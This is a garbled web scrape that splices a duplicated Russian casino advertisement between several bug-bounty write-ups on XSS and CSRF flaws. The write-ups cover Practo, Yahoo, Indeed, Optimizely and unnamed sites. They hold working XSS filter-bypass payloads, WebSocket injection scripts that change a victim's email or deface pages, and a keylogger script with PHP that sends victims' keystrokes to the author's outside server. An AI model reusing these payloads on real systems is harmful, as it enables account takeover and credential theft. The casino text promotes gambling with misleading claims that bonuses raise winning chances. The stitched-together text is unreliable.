игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций.

One night after submitting few bug reports, i was browsing practo.com and then i thought of looking for vulnerabilities on it. After some time i came to know that they have firewall blocking all the XSS payloads so i had to try something advance, but somehow i managed to get HTML Injection on their main domain. Press enter or click to view image in full size Then i started digging deep to get a XSS, but Firewall :( then i thought of going back to brutelogic’s blog and see if it’s possible to bypass it or not. Most of the JS event handlers like onmouseover, onload, onclick was blocked by firewall but after experimenting a lot oncopy worked and triggered a XSS. Press enter or click to view image in full size The payload which worked was : <vipin oncopy = prompt(document.domain)> I reported this issue to Practo and they fixed it within few hours. It was when i just started into security research/bug bounty, it was a great learning experience for me. So guys when you are stuck in such situations just keep on digging and look out for help from other researchers and their blogs it will help for sure. I hope it was helpful for you too.

Generally due to my work i don't have time to hunt for bugs, but when i do i tend to focus only on yahoo as its a sea of assets and they have a great team, along with the fact that i have the proper knowledge in how their sub-domains are organized, so during my usual recon for yahoo i came across this target : http://bf1-adxdb-001.data.bf1.yahoo.com and the response was “The requested URL was not found on this server” as per the below, which is something most yahoo BB hunters see usually. Press enter or click to view image in full size running quick dirsearch on the subject target i found about.php file http://bf1-adxdb-001.data.bf1.yahoo.com/about.php and the response was surprising , there is a private instance for webpagetest ( https://www.webpagetest.org/ ) running on that server as per the below : Press enter or click to view image in full size OK, thats interesting .. Starting digging in the application to find bugs and i couldn’t, even though i found also this default nginx installation endpoint that expose most of the php endpoints in the server : http://bf1-adxdb-001.data.bf1.yahoo.com/nginx.conf so i ran dirsearch on the server again with another wordlist looking for PHP endpoints and found the vulnerable one which is : http://bf1-adxdb-001.data.bf1.yahoo.com/testdb.php and the response was : Fatal error: Call to undefined function mysqli_connect() in /home/y/share/htdocs/testdb.php on line 8 [/testdb.php/] When you reach that point you realize that you must get something out of it, i had a lot of endpoints and i was testing them all but luckily i had my knoxss plugin running for *.yahoo.com and for those who don't know knoxss its a an xss discovery service created by the xss god Brute and you can read about it here https://knoxss.me/?page_id=2 and i recommend using it due to the success i had using it. so when i was testing all endpoints knoxss triggered an xss in the subject domain and this was the final payload : Press enter or click to view image in full size Lessons learned here : 1- don't stop when you see the response forbidden/not found on the target you are testing, run dirsearch or any tool you prefer to find endpoints. 2- Recon wins : Recon in yahoo is not an easy process, planning for a separated blog to describe it, it needs focus and patience, i monitor yahoo assets in shodan.io on daily basis, also whenever i find an interesting sub-domain using aquatone/sublister i try to find other sub-domains under it, and keep going down level by level, i am the crazy guy who runs full ports scan on thousands of ip’s , why ? because that helped me reporting unique stuff, most of my bugs to yahoo were infra related due to a strange open ports , found an Access control servers, appliances, storage consoles, ..atc along with interesting web application that was never touched by other researches, as an example i found stuff in the 5th & 6th level of subdomains in yahoo like the below : target.*.*.*.yahoo.com & target.*.*.*.*.yahoo.com I do know other researchers are smart enough to report bugs in the web apps thats available publicly without doing that kind of recon i do, and they are very successful in that, but you can say i choose the hard way and i am loving it. finally This is how it looks like when you are searching for subdomains in Yahoo, ,, or lets say sub-sub-sub-sub-subdomains Press enter or click to view image in full size Best Regards :) Bug Bounty Hackerone -- -- 6 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters.

So here is one more writeup on a simple bug I found on Indeed.com subdomain. As always I looked up for subdomains using Sublist3r tool. While I was browsing through offfers.indeed.com subdomain ,I noticed a functionality where a user could choose some filters from dropdown and create a PDF report of the data which was generated. I quickly selected some values and generated the report.When I Opened the Report ,I noticed that the URL had an extra parameter Target which had the file location for the PDF file. http://offers.indeed.com/directcontent.html?target=http://offers.indeed.com/company/xy/xxyy.pdf On seeing Target parameter in URL, my instant thought was to test for Open redirect .So I entered Target parameter value as https://www.google.com and I noticed it was actually taking user to Google.com Vulnerable URL :http://offers.indeed.com/directcontent.html?target=http://www.google.com Next was to check if the same parameter was vulnerable to XSS as well. I gave the Target parameter value as javascript:alert(1) and as I was suspecting alert box popped up. Press enter or click to view image in full size I reported this issue to Indeed Via Bugcrowd and the bug was resolved within a week.As part of fix, they completely removed this functionality from the site.

One day I planned to go for it.So here is the writeup on how I found Reflective XSS on a yahoo subdomain. This is my first writeup so please ignore any mistakes that you find. First step was to find subdomains on yahoo and the tool I used was Sublist3r ( https://github.com/aboul3la/Sublist3r ) Press enter or click to view image in full size Once I had the list,I started checking the subdomains one by one.During that time my attention went to one of the subdomains: https://hkfood.yahoo.com There was a search bar on the site to lookup for recipes and I initially tried couple of payloads to see what characters were filtered.For my luck, my inital payload itself worked and I could pop XSS Vulnerable URL : http://hkfood.yahoo.com/search_result#keywords=“/>.<<img src=x onerror=alert(1)//”&gt;>&lt;&gt;&page=1 Press enter or click to view image in full size I reported the bug to Yahoo and the bug was Resolved the very next day.I rechecked the Vulnerable URL and was not able to reproduce the issue. After 2 days,I was getting Bored and thought about retesting around the same XSS bug.This time I found that <script><img> tags were being filtered. So I started trying different combination of payloads to see if I can break the URL. To get <script> tag working,I broke it in pieces like below and added that to the old vulnerable URL and Hurray!!! Payload: <scr<script>ipt>alert(1)</scr</script>ipt> Press enter or click to view image in full size Tips: Always Retest your bugs after its marked Resolved.There is a good chance that you will find a bypass.

Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины.

Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций.

Armaan Pathan 3 min read · Sep 2, 2017 -- 1 Listen Share Press enter or click to view image in full size It was weekend and i was reading some good blogs and looking for good tweets.So after reading some good blog i had decided to give them a try. so this time i chose cobalt.io because i had never hunted on this platform so why not give a try. I had selected my target. which was www.optimizely.com and started looking for some cool bugs. In the application i had found a module which is Create Experiment Press enter or click to view image in full size here you have to enter your website’s URL and give a name and you can do experiments on your website. So simply i had fill up the form by entering my website and given the Experiment name.and my website was loaded into the module, now here i was able to do experiments on my web application. Now there was an option to preview your experiments, Now this option will open the new tab and it will show the experiments which you have done with your application, so first i had not done any experiments and clicked on Preview. So it has opened www.optimizelypriview.com /www.mysite.com in the new tab and it has opened my website into it. Now as it was loading my website within this so i though lets give a try. i had wrote <script>prompt(docoument.domain);</script> into my site and again i put my site into the experiments.and again i clicked on preview.it has opened www.optimizelypriview.com /www.mysite.com in the new tab, but at this time instead of prompting my domain’s name into the pop-up it has prompted www.optimizelypriview.com . :) so yes here i was able to call scripts on the www.optimizelypriview.com from the different domain. Press enter or click to view image in full size I wanted to exploit this xss. so i decided to write small javascript which records the key strokes and give that strokes back to my server where i have hosted my website. So i wrote this to record the keystrokes document.onkeypress = function(evt) { evt = evt || window.event key = String.fromCharCode(evt.charCode) if (key) { var http = new XMLHttpRequest(); var param = encodeURI(key) http.open(“POST”,”http://armaanpathan.pe.hu/exploit.php\",true); http.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”); http.send(“key=”+param); } } and also wrote this to give that keystrokes back to my server and make keylog.txt file and save the keystrokes. <?php $key=$_POST[‘key’]; $logfile=”keylog.txt”; $fp = fopen($logfile, “a”); fwrite($fp, $key); fclose($fp); ?> and after writing this i had updated my website. now what this do, as soon as the page loads the javascript starts recording the keystrokes and makes a file keylog.txt and saves all the logs. now again i put my site into the experiments.and again i clicked on preview.it has opened www.optimizelypriview.com /www.mysite.com. and it has started logging key logs to my server and made a file keylog.txt Press enter or click to view image in full size and if now if i send this link to any victim it starts logging all keystrokes which victim types. and if i open the keylog.txt file it will look like this. Press enter or click to view image in full size but unfortunately the team www.optimizely.com said that this domain is not in the scope :(. but yeah. i had learn many things from this. :D I hope you guys have like it. :) Thanks for reading.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow a Simple CSRF Attack Turned into a P1 Level Bug – Lady Secspeare Skip to content Lady Secspeare Spearing the Security for Good How a Simple CSRF Attack Turned into a P1 Level Bug Posted by Lady Secspeare April 5, 2020 April 5, 2020 Posted in Uncategorized Tags: Bug Bounty , Bug Bounty Hunting , Bugcrowd , Bypassing CSRF , Cross-site Request Forgery , CSRF , CSRF Bypass , P1 Cross-site Request Forgery is easy to lookout for. However, if there are security measures in place to prevent CSRF attacks, they can be exciting (yet nerve-wracking) to bypass. For those who don’t know, Cross-site Request Forgery is an attack where a malicious user can trick the victim into performing actions that they do not intend to do. And some of the preventive measures are: Use of anti-CSRF tokens Use of additional fields such as “Current Password” Use of same site cookies How I Began the Hunt When I received an invite to hunt on a private program on Bugcrowd, which was set to begin on 9th of February, 12AM IST, I was prepared to begin. Considering I was blind to the name of the program and there were 24 other chosen security researchers, I decided to hunt on the website head-on – without any recon. I started looking for endpoints to perform a CSRF attack, I found the most impactful one: Change Password option. When I clicked on it, the following fields were a part of the entire HTTP Request: Mandatory email address field I suspected that the Email field will interfere as it was a mandatory one, but still tried performing CSRF with it. Since, the CSRF POC contained the attacker’s email address when updating the victim’s password it obviously didn’t work. It will only work if I updated the value as victim’s email address in the Email field. So, as an attacker, every time I send the malicious link to the victim, I would have to use the victim’s email address before tricking them into clicking it. It didn’t sit well with me. I wanted to increase the impact. How I Increased the Impact I tried to following: I removed the entire field from the CSRF POC. I only removed the value from the field. I entered random values in the field. (ajhgdsjhgd) None of the above worked. I almost gave up thinking they have secured it against advanced CSRF attacks. I then decided to try something else: I changed the email to a random value with the correct email address format. It didn’t have to be a valid email address; just anything as random as abcdefg@xyz.com. CSRF PoC with random email address I clicked on “Submit” from another browser, acting as the victim, and got the following message: Message for Successfull Password Change using CSRF attack I didn’t want to celebrate just yet. To be sure, I tried logging into victim’s account as the attacker, using the new password. Voila! I was logged in, implying I had successfully changed the victim’s password. Impact This scenario allowed me to take over the victim’s account without any effort of changing the email address value to the victim’s valid address. Furthermore, the severity level increased because just clicking on the link will have the victim locked out of their own account. Bugcrowd rated this simple CSRF as P1 as it was a complete account takeover issue. Why this was possible? Because there was no server-side validation of the Email field. And hence, the remediation for such problem would be to ensure the necessary validation is in place. Takeaway If you ever come across such fields, try to perform CSRF by giving random values, assuming there is no server-side validation. You may just come across a P1 issue. Now, wouldn’t it be a cherry on the top if the program is offering bounty? Share your thoughts. Cheers!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting WebSocket [Application Wide XSS / CSRF] | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting WebSocket [Application Wide XSS / CSRF] Osama Avvan 5 min read · Feb 17, 2020 -- 4 Listen Share Assalam u Alikum, it’s been a while I haven’t contributed to this wonderful community so I am back with a new write up about WebSocket which is fun to exploit. So first of all what is WebSocket? WebSockets allow the client/server to create a 'full-duplex' (two-way) communication channels, allowing the client and server to truly communicate asynchronously, simply both client/server can send and receive messages. So unlike some API endpoints where developers strictly check the Origin Header value, but here in WebSocket case they mostly ignore it, which in result allows any arbitrary Origin to make a connection to the WebSocket instance of the Web App. The format of a WebSocket URL is like this, wss://readact.com, here wss:// is used for a secure SSL connection like https:// some web apps also uses ws:// which is like http:// Now we will look for some places where we can find the WebSocket URL or endpoint. The handiest and easiest way to find WebSocket endpoint is the BurpSuite WebSockets history tab. BurpSuite > Proxy > WebSockets history There you will see all the history of WebSockets requests. The other place where you can look for WebSocket endpoint is the Network tab of your Browser Developer Tool. If WebSocket connection request is sent to the server you will find it there. Now the Place where there is a 99% chance of finding the WebSocket endpoint if the WebApp is using WebSocket is the JavaScript files or the page source of the WebApp, Search for these keywords in the JavaScript file. wss:// ws:// websocket Now after finding the WebSocket endpoint, we have to check if the endpoint is accepting the connection from other Origins . For this simply head to https://www.websocket.org/echo.html and in the Location textbox enter the WebSocket URL/endpoint . Click on the Connect button in the Log box you will get the response, if the connection was successful it will print Connected or if the connection fails it will print DISCONNECTED. You can also check the connection with BurpSuite. From the Burp Repeater send the Request with your Origin in the Origin Header value . If the server responds with a status code of 101 and your specified Origin is reflected OR if you see an * in the Origin header in the response this means that the connection was successful. Now let’s take a look at a Real-World Webapp scenario, I was hunting a private program so when I was inspecting the source code of the dashboard page of the domain, I came across this piece of code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); This confirms that the web app was using WebSocket, now I had to confirm that it accepts connections from other domains too. there are many ways to confirm it which I have also mentioned above, for this case, I just open up a new tab and in from the console I executed this code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e) { console.log(e); } The connection was established and I got the response in the console. Press enter or click to view image in full size So now I can send data to the server and can also receive data from the server. building a (Two-way Communication). Now I set up a listener to listen for incoming and outgoing communication from the server. But there wasn’t anything confidential to listen for. ws.onmessage = function(e) { console.log(e.data); } So now I tried to send a message to the server and was curious that how the server will handle it on the client-side. ws.send(“hello you are vulnerable”); But there was no reflection of the message in the client-side source code. After reading the JS files of the web app, I found a function which was handling the message received from the WebSocket, The data received from the server was being checked in a conditional statement , ws.onmessage = function(e) { if (e.data.indexOf(“||”) > 0) { var messs = e.data.split(“||”); let alertId = messs[0]; var type = messs[1]; let alertDom = messagee(alertId); } } So the data returned by the server must have || in between. and if the condition fulfilled then the data was rendered in the HTML of the page inside a tag. So to confirm that the data is placed inside the tag I sent a message to the server from my connected instance of WebSocket. ws.onopen = function(e) { ws.send(\"hello||you are vulnerable\"); }; Press enter or click to view image in full size and it worked :) Now to perform an XSS I just had to break out of the <a> tag, for this I wrote this code. <script language=”javascript” type=”text/javascript”> var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e){ console.log(e); var a = `”><script>alert(‘XSS’)<\\/script>||leetwa`; ws.send(a); } ws.onmessage = function (evt){ var received_msg = evt.data; console.log(evt.data); } ws.onclose = function(a){ console.log(a);} </script> There I got XSS on all the pages of the web app which were using WebSockets , similarly, I was able to perform CSRF attacks on all the pages using WebSockets and was able to modify the Content of the pages which were using WebSockets making the XSS, CSRF, Content Injection Application wide. Performing a malicious request to change victim email. ws.onopen = function(e) { console.log(e); const payload = `(function(){ const $ = e => document.querySelector(e); $(“#lastName”).value = “Hacked”; $(“#firstName”).value = “Account”; `$(“#company”).value = “Bad Company”; $(“#jobTitle”).value = “Hacker”; $(“#email”).value = “cyber.spidey@hacked.com”; $(“.btn-primary”).click(); `})();` var a = `”><script>${payload}<\\/script>||leetwa` ws.send(a); `}; I hosted this code on my webserver and I just had to send it to the victim and there you go, victim email will be changed or the XSS will execute on all of the pages of the web app. or else I could have changed the HTML of all the open pages by this code. ws.onopen = function(e) { console.log(e); const payload = “<center><h1>You have been Hacked</h1><br> <br><h1>Contact here: <a href=’https://evil.com'>Evil.com</a></h1></center>\" var a = `”><script>document.querySelector(“body”).innerHTML = “${payload}”<\\/script>||leetwa` `ws.send(a); }; That’s it Thank you for reading, the bug was accepted as a P1.

Now, as user B there is a button of add to cart , when you click on it that public wish-list will be added in to your cart. The button was making a simple HTTP GET request which looks like this https://www.SomeWebsite.com/xyz?some_page=wishlist&move_all=true&w_id=1337&public_cid=31337 There were no HTTP headers which contains CSRF Token and none of the parameter was there to protect it from CSRF. So, attacker can add alot of products in to his/her wishlist and then perform CSRF to spam the cart of victim. Reward/bounty This was fixed within a day and $25 was rewarded for this. 2.) Bypass of CSRF protection to delete the bookmark. The second CSRF was found at the functionality which can let user to delete his/her bookmark jobs. As i mentioned above this delete button was also making GET HTTP request BUT i was not able to perform CSRF. I looked for the reason why CSRF is not working for this request and then i realise it could be referer header which may be protecting this request from CSRF. So, i thought of trying the bypass where you can create the whole path of website in your website. e.g. myCSRFwebsite.com/www.victimWebsite.com/abc/xyz/csrf.html The website was checking the value of referer header , whether it contains the path www.victimWebsite.com/abc/xyz/csrf.html and thus , attacker’s website contains the folders/path as above string , website allows the CSRF. Here is the link of write-up of the bypass https://medium.com/bugbountywriteup/critical-bypass-csrf-protection-on-ibm-313ffb68dd0c Reward/bounty I thought I will get good amount because I showed them how CSRF protection can be bypassed but they paid only $25 for this. 3.) CSRF disguised in APIs I have found this CSRF in a private program of hackerone where the whole website was calling the API to perform the actions. So, i thought there will be no chance of CSRF because all API calls to perform any action contains the Auth-header which protect the request from CSRF. But after looking at every request i found two endpoints , one of which performs deletion of phone number and the other was changing the communication settings and the best part was it was GET request and POST Request respectively with no CSRF token. After this i realise , it is best to look for all the actions , may be there are some actions which is not performed by API and can be vulnerable to CSRF. Reward/Bounty I got no bounty for this , but got 14 repo points at hackerone. I added this bug in this article because i learned something new from this finding. 4.) CSRF to delete favourite list [T-Shirt as a swag]. There was a section in the website which let user to favourite the articles. Now there was also a button to delete the favourite list. And that action was done by a POST HTTP request with no CSRF Token in the POST request. So, CSRF can be performed to Delete the article from favourite list. Reward/bounty They sent me a T-shirt as a reward/swag. Thanks! Hope you like this post.

